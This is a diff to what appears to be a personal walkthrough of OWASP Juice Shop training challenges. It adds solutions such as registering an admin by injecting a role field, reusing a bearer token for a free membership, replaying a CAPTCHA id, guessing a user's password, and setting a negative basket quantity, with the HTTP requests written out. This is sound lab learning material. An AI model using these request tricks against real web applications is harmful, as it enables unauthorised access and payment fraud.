@@ -157,6 +157,8 @@ Looks like the two `#` components of the URL aren't being encoded! Encoding them
 
 Removing the `disabled="true"` from the `registerButton` allows registering a user without validation fields. Submitting a registration with mismatching passwords solves the challenge.
 
+Alternatively, choose a matching `Repeat Password` and then modify the `Password` field. The validation for matching passwords occurs only when the `Repeat Password` field is modified.
+
 
 # Upload Type :star::star::star:
 
@@ -166,3 +168,96 @@ POST /file-upload HTTP/1.1
 ```
 
 I crafted a request in `Postman` with a `file` key & `.png` file value pair in the request body.
+
+
+# Login MC SafeSearch :star::star:
+
+We know MC SafeSearch's email is `mc.safesearch@juice-sh.op` from looking at the registered users in the admin section. The [Protect Ya' Passwordz](https://www.youtube.com/watch?v=v59CX2DiX0Y) song reveals a few password hints:
+
+- Name of favourite pet, Mr Noodles
+- Replaced `o`'s with `0`'s
+
+Trying a few different variations quickly got me in, with `Mr. N00dles` being the actual password.
+
+
+# Admin Registration :star::star::star:
+
+Registering a user through the usual registration form sends a `POST` request, which receives a response like so:
+```json
+{
+    "status": "success",
+    "data": {
+        "username": "",
+        "role": "customer",
+        "deluxeToken": "",
+        "lastLoginIp": "0.0.0.0",
+        "profileImage": "/assets/public/images/uploads/default.svg",
+        "isActive": true,
+        "id": 20,
+        "email": "a@ab",
+        "updatedAt": "2020-08-13T01:13:46.625Z",
+        "createdAt": "2020-08-13T01:13:46.625Z",
+        "deletedAt": null
+    }
+}
+```
+
+There's a `role` field. Let's send a `POST` request which specifies the `role`. Funnily enough, no other fields are required. Not even an email and password.
+```http
+POST /api/Users/? HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{
+    "role":"admin"
+}
+```
+
+
+# Deluxe Fraud :star::star::star:
+
+Yoinked the bearer token from another request and attached it to this one. No need to attach a payment method to the request!
+
+```http
+POST /rest/deluxe-membership HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer REDACTED
+```
+
+
+# CAPTCHA Bypass :star::star::star:
+
+Did a couple feedback submissions through the web form. Turns out there's an incrementing `captchaId` and associated correct answer. I resent the same request over and over using the same `captchaId`.
+
+```http
+POST /api/Feedbacks/ HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{
+    "captchaId":0,
+    "captcha":"-23",
+    "rating":""
+}
+```
+
+
+# Multiple Likes :star::star::star::star::star::star:
+
+Literally just smashed that like button (spam clicked). I don't think this was the intended solution. Better come back to this one.
+
+
+# Payback Time :star::star::star:
+
+Adding an item to the basket sends a `PUT` request. Copied the request (token and all) and changed the quantity to a negative. Fired the request through and checked out as usual, except now the shop is buying from me! Muahaha.
+
+```http
+PUT /api/BasketItems/12 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer REDACTED
+Content-Type: application/json
+
+{
+    "quantity":-1337
+}
+```
